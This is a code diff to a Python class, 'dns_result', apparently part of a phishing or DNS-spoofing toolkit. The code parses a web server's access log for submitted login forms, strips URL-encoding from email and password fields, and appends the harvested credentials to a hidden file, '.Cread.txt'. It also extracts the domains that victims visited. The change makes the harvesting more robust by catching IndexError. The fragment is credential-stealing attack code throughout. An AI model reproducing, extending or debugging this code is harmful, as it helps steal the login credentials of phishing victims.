@@ -31,13 +31,16 @@ class dns_result :
                 line_cread = str("".join(line_split)).replace('+&password',' ').replace('&captcha_text',' ').split(',')
                 line_cread_1 = str("".join(line_cread[0])).replace("['",'').replace("'",'')\
                 .replace('%40','@').replace("&password",'').replace('+&key1','').replace('&key1','').replace('&session_password','')
-                line_cread_2 = str("".join(line_cread[1])).replace("]",'')\
-                .replace("']",'').replace("'",'').replace('\\n','').replace("&signIn",'').replace('&isJsEnabled','').strip()
-                with open (Path_St+'/ServerLog/.Cread.txt','a') as Cread_User :
-                     Cread_User.write(line_cread_1+'\n'+line_cread_2+'\n')
+                try: 
+                    line_cread_2 = str("".join(line_cread[1])).replace("]",'')\
+                    .replace("']",'').replace("'",'').replace('\\n','').replace("&signIn",'').replace('&isJsEnabled','').strip()  
+                    with open (Path_St+'/ServerLog/.Cread.txt','a') as Cread_User :
+                        Cread_User.write(line_cread_1+'\n'+line_cread_2+'\n')
+                except IndexError:
+                       pass          
                 with open(Path_St+'/ServerLog/log_access.log','r') as accesslog:
-                    accesslog = accesslog.readlines()#[-243:]
-                    for line1 in accesslog:    
+                        accesslog = accesslog.readlines()#[-243:]
+                for line1 in accesslog:    
                       if "GET" in line1 or "POST" in line1:
                           self.domain_web = str(re.findall('https?://(www\.)?([a-zA-Z0-9]+)(\.[a-zA-Z0-9.-]+)', line1 ))\
                           .replace("[('', '",'').replace("')]",'').replace("', '.",'.').replace('[]','').replace('\n','')
